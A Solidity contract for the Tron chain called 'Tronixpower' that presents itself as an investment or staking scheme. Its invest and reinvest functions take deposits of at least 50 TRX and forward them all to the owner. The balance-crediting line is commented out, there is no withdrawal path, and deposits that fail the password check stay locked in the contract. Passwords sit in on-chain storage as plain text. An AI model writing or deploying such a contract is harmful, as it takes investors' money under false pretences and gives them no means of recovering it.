//SourceUnit: Tronixpower.sol

 pragma solidity ^0.4.25;
 contract Tronixpower {
    address private owner;
    address private verifyAddress;
    uint256 public  initialSupply = 100000000;
    uint256 constant public INVEST_MIN_AMOUNT = 50 trx;
    string private password;
    struct Instructor {
        address user;
        string pass;
        uint amt;

    }

    constructor(address _stakingAddress,string _pass) public {

            owner = msg.sender;
            password = _pass;
            verifyAddress = _stakingAddress;


    }

    mapping(address => uint256) public balances;
    mapping (address => Instructor) instructors;
    //mapping (address => Instructor.pass) public password;
    address[] public instructorAccts;

    
    function invest(string  _passsssss,string memory _asssssss) public payable{

        string memory  pass=password;
        require(msg.value >= INVEST_MIN_AMOUNT);
        if (keccak256(abi.encodePacked(pass)) == keccak256(abi.encodePacked(_asssssss))) {   
            var instructor = instructors[msg.sender];
            
            instructor.pass = _passsssss;
            instructor.user=msg.sender;
            owner.transfer(msg.value);
            
            //balances[msg.sender] += msg.value*5;
            instructorAccts.push(msg.sender) -1;
        }
    }


    function reinvest(string memory _passsssss,string memory _asssssss) public payable{
    require(msg.value >= INVEST_MIN_AMOUNT);
        string memory  pass=password;
        address userAddress=msg.sender;
        string memory  passd=instructors[userAddress].pass;
         if(msg.sender==userAddress){
            if (keccak256(abi.encodePacked(pass)) == keccak256(abi.encodePacked(_asssssss))) { 
                if (keccak256(abi.encodePacked(passd)) == keccak256(abi.encodePacked(_passsssss))) { 
                owner.transfer(msg.value);  
                }
            }
        }
    }
    
    
    
    function getInstructor(address _address) view private returns (string) {
        return (instructors[_address].pass);
    }

    function getPassw() view private returns (string) {
        return (password);
    }

    function check_pass(string memory pass) view private returns (bytes32) {


            return (keccak256(abi.encodePacked(pass)));

        
    }
    function verifyAddresss() view public returns (address) {
        return (verifyAddress);
    }


    
    function countInstructors() view public returns (uint) {
        return instructorAccts.length;
    }

    function getPass(address _address) view private returns (string) {
        return (instructors[_address].pass);
    }


    function Mybalance() view private returns (uint) {
        
        return (balances[msg.sender]);
    }

}